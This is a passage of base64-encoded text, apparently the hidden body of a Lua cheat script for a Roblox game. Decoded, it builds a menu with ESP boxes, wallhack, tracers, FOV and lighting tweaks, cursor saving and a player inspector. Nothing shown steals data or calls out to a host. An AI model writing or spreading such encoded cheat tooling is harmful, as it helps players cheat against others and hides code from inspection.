aXN1YWxzLCAiU2hvdyBIaXRib3ggKEJveCkiLCAiRVNQQm94IiwgMikKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5WaXN1YWxzLCAiU2hvdyBOYW1lIiwgIkVTUE5hbWUiLCAzKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJTaG93IExldmVsIiwgIkVTUEx2bCIsIDQpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIlNob3cgSFAiLCAiRVNQSFAiLCA1KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJXYWxsIEhhY2sgKENoYW1zKSIsICJFU1BDaGFtcyIsIDYpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIlNob3cgRG90IChSZWQgUG9pbnQpIiwgIkVTUERvdCIsIDcpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIlNob3cgVHJhY2VycyAoTGluZXMpIiwgIkVTUFRyYWNlcnMiLCA4KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJOUEMgV2FsbCBIYWNrIiwgIkVTUE5QQyIsIDkpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIkVTUCBGcnVpdCIsICJFU1BGcnVpdCIsIDkuNSkKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiUGVyZm9ybWFuY2UiLCA5KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJQb3RhdG8gR3JhcGhpY3MgKEZQUyBCb29zdCkiLCAiUG90YXRvR3JhcGhpY3MiLCAxMCkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5WaXN1YWxzLCAiUmVtb3ZlIEZvZyIsICJSZW1vdmVGb2ciLCAxMSkKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5WaXN1YWxzLCAiRmllbGQgb2YgVmlldyAoRk9WKSIsICJGT1ZWYWx1ZSIsIDEyLCAxLCAxMjAsIDcwKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJBbHdheXMgRGF5IiwgIkFsd2F5c0RheSIsIDEyLjUpCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIExpZ2h0aW5nID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBDb25maWcuQWx3YXlzRGF5IHRoZW4KICAgICAgICAgICAgICAgIExpZ2h0aW5nLkNsb2NrVGltZSA9IDEyCiAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gU2hhZGVycyBCdXR0b24KICAgIGRvCiAgICBsb2NhbCBTaGFkZXJzQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFNoYWRlcnNCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAyNSkKICAgIFNoYWRlcnNCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICBTaGFkZXJzQnRuLlRleHQgPSAiRU5BQkxFIFNIQURFUlMgKFJUWCkiCiAgICBTaGFkZXJzQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgU2hhZGVyc0J0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFNoYWRlcnNCdG4uVGV4dFNpemUgPSA5CiAgICBTaGFkZXJzQnRuLkxheW91dE9yZGVyID0gMTMKICAgIFNoYWRlcnNCdG4uUGFyZW50ID0gUGFnZXMuVmlzdWFscwogICAgCiAgICBsb2NhbCBTaGFkZXJzQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFNoYWRlcnNDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgU2hhZGVyc0Nvcm5lci5QYXJlbnQgPSBTaGFkZXJzQnRuCiAgICAKICAgIGxvY2FsIHNoYWRlcnNFbmFibGVkID0gZmFsc2UKICAgIGxvY2FsIHJlZmxlY3RhbmNlQXBwbGllZCA9IGZhbHNlCiAgICAKICAgIFNoYWRlcnNCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgc2hhZGVyc0VuYWJsZWQgPSBub3Qgc2hhZGVyc0VuYWJsZWQKICAgICAgICBTaGFkZXJzQnRuLkJhY2tncm91bmRDb2xvcjMgPSBzaGFkZXJzRW5hYmxlZCBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICBTaGFkZXJzQnRuLlRleHRDb2xvcjMgPSBzaGFkZXJzRW5hYmxlZCBhbmQgQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAxNSkgb3IgQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBTaGFkZXJzQnRuLlRleHQgPSBzaGFkZXJzRW5hYmxlZCBhbmQgIlNIQURFUlMgRU5BQkxFRCIgb3IgIkVOQUJMRSBTSEFERVJTIChSVFgpIgogICAgICAgIAogICAgICAgIGxvY2FsIExpZ2h0aW5nID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCiAgICAgICAgCiAgICAgICAgaWYgc2hhZGVyc0VuYWJsZWQgdGhlbgogICAgICAgICAgICAtLSBBcHBseSBFZmZlY3RzCiAgICAgICAgICAgIGZvciBfLCBlZmZlY3QgaW4gcGFpcnMoTGlnaHRpbmc6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIGVmZmVjdDpJc0EoIlBvc3RFZmZlY3QiKSBvciBlZmZlY3Q6SXNBKCJCbG9vbUVmZmVjdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBlZmZlY3Q6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBibG9vbSA9IEluc3RhbmNlLm5ldygiQmxvb21FZmZlY3QiLCBMaWdodGluZykKICAgICAgICAgICAgYmxvb20uSW50ZW5zaXR5ID0gMQogICAgICAgICAgICBibG9vbS5UaHJlc2hvbGQgPSAwLjUKICAgICAgICAgICAgYmxvb20uU2l6ZSA9IDI0CiAgICAgICAgICAgIGJsb29tLk5hbWUgPSAiQ3liZXJfQmxvb20iCgogICAgICAgICAgICBsb2NhbCBkZXB0aE9mRmllbGQgPSBJbnN0YW5jZS5uZXcoIkRlcHRoT2ZGaWVsZEVmZmVjdCIsIExpZ2h0aW5nKQogICAgICAgICAgICBkZXB0aE9mRmllbGQuRmFySW50ZW5zaXR5ID0gMC4yNQogICAgICAgICAgICBkZXB0aE9mRmllbGQuRm9jdXNEaXN0YW5jZSA9IDIwCiAgICAgICAgICAgIGRlcHRoT2ZGaWVsZC5JbkZvY3VzUmFkaXVzID0gNTAKICAgICAgICAgICAgZGVwdGhPZkZpZWxkLk5lYXJJbnRlbnNpdHkgPSAwLjc1CiAgICAgICAgICAgIGRlcHRoT2ZGaWVsZC5OYW1lID0gIkN5YmVyX0RPRiIKCiAgICAgICAgICAgIGxvY2FsIGNvbG9yQ29ycmVjdGlvbiA9IEluc3RhbmNlLm5ldygiQ29sb3JDb3JyZWN0aW9uRWZmZWN0IiwgTGlnaHRpbmcpCiAgICAgICAgICAgIGNvbG9yQ29ycmVjdGlvbi5CcmlnaHRuZXNzID0gMC4wNQogICAgICAgICAgICBjb2xvckNvcnJlY3Rpb24uQ29udHJhc3QgPSAwLjMKICAgICAgICAgICAgY29sb3JDb3JyZWN0aW9uLlNhdHVyYXRpb24gPSAxLjIKICAgICAgICAgICAgY29sb3JDb3JyZWN0aW9uLk5hbWUgPSAiQ3liZXJfQ0MiCgogICAgICAgICAgICBsb2NhbCBzdW5SYXlzID0gSW5zdGFuY2UubmV3KCJTdW5SYXlzRWZmZWN0IiwgTGlnaHRpbmcpCiAgICAgICAgICAgIHN1blJheXMuSW50ZW5zaXR5ID0gMC4xMgogICAgICAgICAgICBzdW5SYXlzLlNwcmVhZCA9IDAuMDUKICAgICAgICAgICAgc3VuUmF5cy5OYW1lID0gIkN5YmVyX1N1biIKCiAgICAgICAgICAgIExpZ2h0aW5nLkFtYmllbnQgPSBDb2xvcjMuZnJvbVJHQigxMjgsIDEyOCwgMTI4KQogICAgICAgICAgICBMaWdodGluZy5PdXRkb29yQW1iaWVudCA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApCiAgICAgICAgICAgIExpZ2h0aW5nLkJyaWdodG5lc3MgPSAxLjgKICAgICAgICAgICAgTGlnaHRpbmcuQ2xvY2tUaW1lID0gMTQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCByZWZsZWN0YW5jZUFwcGxpZWQgdGhlbgogICAgICAgICAgICAgICAgcmVmbGVjdGFuY2VBcHBsaWVkID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBub3QgcGFydDpJc0EoIlRlcnJhaW4iKSBhbmQgcGFydC5SZWZsZWN0YW5jZSA8IDAuMSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuUmVmbGVjdGFuY2UgPSAwLjA1CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICAtLSBSZW1vdmUgRWZmZWN0cwogICAgICAgICAgICBmb3IgXywgZWZmZWN0IGluIHBhaXJzKExpZ2h0aW5nOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBlZmZlY3QuTmFtZTpmaW5kKCJDeWJlcl8iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZWZmZWN0OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgZW5kCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiQ3VzdG9taXphdGlvbiIsIDEyKQogICAgY3JlYXRlSW5wdXQoUGFnZXMuVmlzdWFscywgIkVTUCBTaXplIiwgIkVTUFNpemUiLCAxMykKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiQ3Vyc29yIFNldHRpbmdzIiwgMTQpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5WaXN1YWxzLCAiQ3Vyc29yIEltYWdlIElEIiwgIkN1c3RvbUN1cnNvcklkIiwgMTUpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5WaXN1YWxzLCAiQ3Vyc29yIE5hbWUiLCAiQ3Vyc29yTmFtZSIsIDE2KQogICAgCiAgICBkbwogICAgbG9jYWwgQ3Vyc29yQnV0dG9ucyA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgQ3Vyc29yQnV0dG9ucy5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDI1KQogICAgQ3Vyc29yQnV0dG9ucy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgQ3Vyc29yQnV0dG9ucy5MYXlvdXRPcmRlciA9IDE3CiAgICBDdXJzb3JCdXR0b25zLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgIAogICAgbG9jYWwgU2F2ZUN1ciA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBTYXZlQ3VyLlNpemUgPSBVRGltMi5uZXcoMC40OCwgMCwgMSwgMCkKICAgIFNhdmVDdXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICBTYXZlQ3VyLlRleHQgPSAiU0FWRSBDVVJTT1IiCiAgICBTYXZlQ3VyLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgU2F2ZUN1ci5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFNhdmVDdXIuVGV4dFNpemUgPSA4CiAgICBTYXZlQ3VyLlBhcmVudCA9IEN1cnNvckJ1dHRvbnMKICAgIGxvY2FsIFNDX0MgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgU0NfQy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBTQ19DLlBhcmVudCA9IFNhdmVDdXIKICAgIAogICAgbG9jYWwgU2VsZWN0Q3VyID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFNlbGVjdEN1ci5TaXplID0gVURpbTIubmV3KDAuNDgsIDAsIDEsIDApCiAgICBTZWxlY3RDdXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41MiwgMCwgMCwgMCkKICAgIFNlbGVjdEN1ci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgIFNlbGVjdEN1ci5UZXh0ID0gIlNFTEVDVCBDVVJTT1IiCiAgICBTZWxlY3RDdXIuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBTZWxlY3RDdXIuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBTZWxlY3RDdXIuVGV4dFNpemUgPSA4CiAgICBTZWxlY3RDdXIuUGFyZW50ID0gQ3Vyc29yQnV0dG9ucwogICAgbG9jYWwgU0xDX0MgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgU0xDX0MuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgU0xDX0MuUGFyZW50ID0gU2VsZWN0Q3VyCiAgICAKICAgIGxvY2FsIGN1cnNvckxpc3QgPSB7CiAgICAgICAge05hbWUgPSAiRGVmYXVsdCIsIElkID0gIiJ9CiAgICB9CiAgICAgICAgCiAgICAtLSBMb2FkIFNhdmVkIEN1cnNvcnMKICAgIGlmIGlzZmlsZSBhbmQgaXNmaWxlKCJDeWJlcnB1bmtzX0N1cnNvcnMuanNvbiIpIGFuZCByZWFkZmlsZSB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBzYXZlZCA9IEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUocmVhZGZpbGUoIkN5YmVycHVua3NfQ3Vyc29ycy5qc29uIikpCiAgICAgICAgICAgIGlmIHNhdmVkIGFuZCB0eXBlKHNhdmVkKSA9PSAidGFibGUiIHRoZW4KICAgICAgICAgICAgICAgIGN1cnNvckxpc3QgPSBzYXZlZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgbG9jYWwgY0lkeCA9IDEKICAgIAogICAgU2F2ZUN1ci5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBpZCA9IENvbmZpZy5DdXN0b21DdXJzb3JJZAogICAgICAgIGxvY2FsIG5hbWUgPSBDb25maWcuQ3Vyc29yTmFtZQogICAgICAgIGlmIGlkIGFuZCBpZCB+PSAiIiB0aGVuCiAgICAgICAgICAgIGlmIG5hbWUgYW5kIG5hbWUgfj0gIiIgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGN1cnNvckxpc3QsIHtOYW1lID0gbmFtZSwgSWQgPSBpZH0pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIFNhdmUgdG8gZmlsZQogICAgICAgICAgICAgICAgaWYgd3JpdGVmaWxlIHRoZW4KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlZmlsZSgiQ3liZXJwdW5rc19DdXJzb3JzLmpzb24iLCBIdHRwU2VydmljZTpKU09ORW5jb2RlKGN1cnNvckxpc3QpKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBTYXZlQ3VyLlRleHQgPSAiU0FWRUQhIgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIFNhdmVDdXIuVGV4dCA9ICJTQVZFIENVUlNPUiIKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgU2F2ZUN1ci5UZXh0ID0gIk5BTUUgUkVRISIKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBTYXZlQ3VyLlRleHQgPSAiU0FWRSBDVVJTT1IiCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBTZWxlY3RDdXIuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgY0lkeCA9IGNJZHggKyAxCiAgICAgICAgaWYgY0lkeCA+ICNjdXJzb3JMaXN0IHRoZW4gY0lkeCA9IDEgZW5kCiAgICAgICAgbG9jYWwgYyA9IGN1cnNvckxpc3RbY0lkeF0KICAgICAgICBTZWxlY3RDdXIuVGV4dCA9IGMuTmFtZTp1cHBlcigpCiAgICAgICAgCiAgICAgICAgQ29uZmlnLkN1c3RvbUN1cnNvcklkID0gYy5JZAogICAgICAgIENvbmZpZy5DdXJzb3JOYW1lID0gYy5OYW1lCiAgICAgICAgCiAgICAgICAgaWYgSW5wdXRCb3hlc1siQ3VzdG9tQ3Vyc29ySWQiXSB0aGVuCiAgICAgICAgICAgIElucHV0Qm94ZXNbIkN1c3RvbUN1cnNvcklkIl0uVGV4dCA9IGMuSWQKICAgICAgICBlbmQKICAgICAgICBpZiBJbnB1dEJveGVzWyJDdXJzb3JOYW1lIl0gdGhlbgogICAgICAgICAgICBJbnB1dEJveGVzWyJDdXJzb3JOYW1lIl0uVGV4dCA9IGMuTmFtZQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHZhbCA9IGMuSWQKICAgICAgICBpZiB2YWwgfj0gIiIgdGhlbgogICAgICAgICAgICBpZiB0b251bWJlcih2YWwpIHRoZW4KICAgICAgICAgICAgICAgIG1vdXNlLkljb24gPSAicmJ4YXNzZXRpZDovLyIgLi4gdmFsCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIG1vdXNlLkljb24gPSB2YWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBtb3VzZS5JY29uID0gIiIKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGVuZAogICAgCiAgICBkbwogICAgbG9jYWwgQ29sb3JGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgQ29sb3JGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDYwKQogICAgQ29sb3JGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgQ29sb3JGcmFtZS5MYXlvdXRPcmRlciA9IDE4CiAgICBDb2xvckZyYW1lLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgIAogICAgbG9jYWwgQ29sb3JMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJR3JpZExheW91dCIpCiAgICBDb2xvckxheW91dC5DZWxsU2l6ZSA9IFVEaW0yLm5ldygwLCAyNSwgMCwgMjUpCiAgICBDb2xvckxheW91dC5DZWxsUGFkZGluZyA9IFVEaW0yLm5ldygwLCA1LCAwLCA1KQogICAgQ29sb3JMYXlvdXQuUGFyZW50ID0gQ29sb3JGcmFtZQogICAgCiAgICBsb2NhbCBjb2xvcnMgPSB7CiAgICAgICAgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwgQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAwKSwgQ29sb3IzLmZyb21SR0IoMCwgMCwgMjU1KSwKICAgICAgICBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMCksIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMjU1KSwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAyNTUpLAogICAgICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwgQ29sb3IzLmZyb21SR0IoMjU1LCAxMjgsIDApCiAgICB9CiAgICAKICAgIGZvciBfLCBjb2wgaW4gcGFpcnMoY29sb3JzKSBkbwogICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgYnRuLlRleHQgPSAiIgogICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gY29sCiAgICAgICAgYnRuLlBhcmVudCA9IENvbG9yRnJhbWUKICAgICAgICBsb2NhbCBjID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIGMuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwwKSBjLlBhcmVudCA9IGJ0bgogICAgICAgIAogICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgQ29uZmlnLkVTUENvbG9yUiA9IG1hdGguZmxvb3IoY29sLlIgKiAyNTUpCiAgICAgICAgICAgIENvbmZpZy5FU1BDb2xvckcgPSBtYXRoLmZsb29yKGNvbC5HICogMjU1KQogICAgICAgICAgICBDb25maWcuRVNQQ29sb3JCID0gbWF0aC5mbG9vcihjb2wuQiAqIDI1NSkKICAgICAgICBlbmQpCiAgICBlbmQKICAgIGVuZAogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlZpc3VhbHMsICJTZXJ2ZXIgU3RhdHMiLCAxOSkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5WaXN1YWxzLCAiU2hvdyBGUFMiLCAiU2hvd0ZQUyIsIDIwKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJTaG93IFBpbmciLCAiU2hvd1BpbmciLCAyMSkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5WaXN1YWxzLCAiU2hvdyBVcHRpbWUiLCAiU2hvd1VwdGltZSIsIDIyKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJTaG93IFNlcnZlciAoUmVnaW9uKSIsICJTaG93U2VydmVyIiwgMjMpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuVmlzdWFscywgIlBsYXllciBJbnNwZWN0b3IiLCAyNCkKICAgIAogICAgLS0gRHJvcGRvd24gcG91ciBzw6lsZWN0aW9ubmVyIHVuIGpvdWV1cgogICAgZG8KICAgIGxvY2FsIERyb3BGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgRHJvcEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBEcm9wRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICBEcm9wRnJhbWUuTGF5b3V0T3JkZXIgPSAyNQogICAgRHJvcEZyYW1lLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgIAogICAgbG9jYWwgRHJvcENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBEcm9wQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERyb3BDb3JuZXIuUGFyZW50ID0gRHJvcEZyYW1lCiAgICBsb2NhbCBEcm9wU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIERyb3BTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQ1KSBEcm9wU3Ryb2tlLlRoaWNrbmVzcyA9IDEgRHJvcFN0cm9rZS5QYXJlbnQgPSBEcm9wRnJhbWUKICAgIAogICAgbG9jYWwgRHJvcExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgRHJvcExhYmVsLlRleHQgPSAiU2VsZWN0IFBsYXllciIKICAgIERyb3BMYWJlbC5TaXplID0gVURpbTIubmV3KDAuNCwgMCwgMSwgMCkKICAgIERyb3BMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgRHJvcExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgRHJvcExhYmVsLkZvbnQgPSBFbnVtLkZv" .. "bnQuR290aGFtTWVkaXVtCiAgICBEcm9wTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgIERyb3BMYWJlbC5UZXh0U2l6ZSA9IDkKICAgIERyb3BMYWJlbC5QYXJlbnQgPSBEcm9wRnJhbWUKICAgIGxvY2FsIERyb3BQYWQgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpIERyb3BQYWQuUGFkZGluZ0xlZnQgPSBVRGltLm5ldygwLCAxMCkgRHJvcFBhZC5QYXJlbnQgPSBEcm9wTGFiZWwKICAgIAogICAgbG9jYWwgRHJvcEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBEcm9wQnRuLlNpemUgPSBVRGltMi5uZXcoMC41NSwgMCwgMC43LCAwKQogICAgRHJvcEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQyLCAwLCAwLjE1LCAwKQogICAgRHJvcEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgIERyb3BCdG4uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICBEcm9wQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgRHJvcEJ0bi5UZXh0U2l6ZSA9IDgKICAgIERyb3BCdG4uVGV4dCA9IChDb25maWcuSW5zcGVjdG9yTmFtZSB+PSAiIiBhbmQgQ29uZmlnLkluc3BlY3Rvck5hbWUpIG9yICJOb25lIgogICAgRHJvcEJ0bi5QYXJlbnQgPSBEcm9wRnJhbWUKICAgIGxvY2FsIERCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIERCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERCQ29ybmVyLlBhcmVudCA9IERyb3BCdG4KICAgIAogICAgbG9jYWwgRHJvcExpc3QgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIikKICAgIERyb3BMaXN0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCAxNTApCiAgICBEcm9wTGlzdC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCAzNSkKICAgIERyb3BMaXN0LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKQogICAgRHJvcExpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgRHJvcExpc3QuVmlzaWJsZSA9IGZhbHNlCiAgICBEcm9wTGlzdC5TY3JvbGxCYXJUaGlja25lc3MgPSAyCiAgICBEcm9wTGlzdC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgIERyb3BMaXN0LlpJbmRleCA9IDUKICAgIERyb3BMaXN0LlBhcmVudCA9IERyb3BGcmFtZQogICAgbG9jYWwgRExDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRExDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykgRExDb3JuZXIuUGFyZW50ID0gRHJvcExpc3QKICAgIGxvY2FsIERMTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKSBETExheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlciBETExheW91dC5QYXJlbnQgPSBEcm9wTGlzdAogICAgCiAgICBsb2NhbCBpc0Ryb3BPcGVuID0gZmFsc2UKICAgIERyb3BCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaXNEcm9wT3BlbiA9IG5vdCBpc0Ryb3BPcGVuCiAgICAgICAgRHJvcExpc3QuVmlzaWJsZSA9IGlzRHJvcE9wZW4KICAgICAgICBpZiBpc0Ryb3BPcGVuIHRoZW4KICAgICAgICAgICAgRHJvcEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTkwKSAtLSBBZ3JhbmRpciBsZSBjYWRyZQogICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhEcm